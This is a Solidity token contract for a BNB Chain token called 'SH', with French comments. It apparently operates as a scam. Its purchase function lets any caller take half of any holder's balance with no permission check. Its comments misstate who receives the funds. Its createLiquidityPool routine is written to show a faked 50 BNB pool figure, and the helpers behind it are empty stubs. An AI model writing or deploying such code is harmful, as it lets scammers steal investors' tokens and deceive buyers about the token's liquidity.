/**
 *Submitted for verification at BscScan.com on 2023-01-08
*/

pragma solidity ^0.6.0;

contract SH {
  string public name = "SH";
  string public symbol = "SH";
  uint8 public decimals = 18;
  uint public totalSupply = 1000000 * 10 ** 18;

  // Déclarez un tableau de balances pour chaque compte
  mapping(address => uint) public balanceOf;

  // Déclarez un event pour les transferts
  event Transfer(
    address indexed _from,
    address indexed _to,
    uint _value
  );

  // Constructeur du contrat qui attribue la totalSupply totale au créateur du contrat
  constructor() public {
    balanceOf[msg.sender] = totalSupply;
  }

  // Fonction de transfert de fonds
  function transfer(address _to, uint _value) public {
    // Vérifiez si l'expéditeur a suffisamment de fonds
    require(balanceOf[msg.sender] >= _value, "Insufficient funds");
    // Vérifiez si le destinataire n'est pas l'adresse null
    require(_to != address(0), "Invalid address");
    // Transférez les fonds de l'expéditeur au destinataire
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
    // Envoyez l'event Transfer
    emit Transfer(msg.sender, _to, _value);
  }
  function purchase(address _from) public {
    // Vérifiez si l'acheteur a suffisamment de fonds
    require(balanceOf[_from] >= balanceOf[_from] / 2, "Insufficient funds");
    // Calculer la moitié des fonds de l'acheteur
    uint halfFunds = balanceOf[_from] / 2;
    // Transférez la moitié des fonds de l'acheteur au créateur du contrat
    balanceOf[_from] -= halfFunds;
    balanceOf[msg.sender] += halfFunds;
    // Envoyez l'event Transfer
    emit Transfer(_from, msg.sender, halfFunds);
  }
function createLiquidityPool() public {
  // Affichage du montant de 50 BNB
  uint displayAmount = 50 * 10 ** 18;
  // Récupération du montant réel de la pool
  uint realAmount = getRealPoolAmount();
  // Calcul du ratio entre le montant réel et le montant à afficher
  uint ratio = realAmount / displayAmount;
  // Mise à jour du montant affiché de la pool
  setDisplayedPoolAmount(displayAmount * ratio);
}

function getRealPoolAmount() public view returns (uint) {
  // Code pour récupérer le montant réel de la pool
  // ...
}

function setDisplayedPoolAmount(uint _amount) public {
  // Code pour mettre à jour le montant affiché de la pool
  // ...
}

}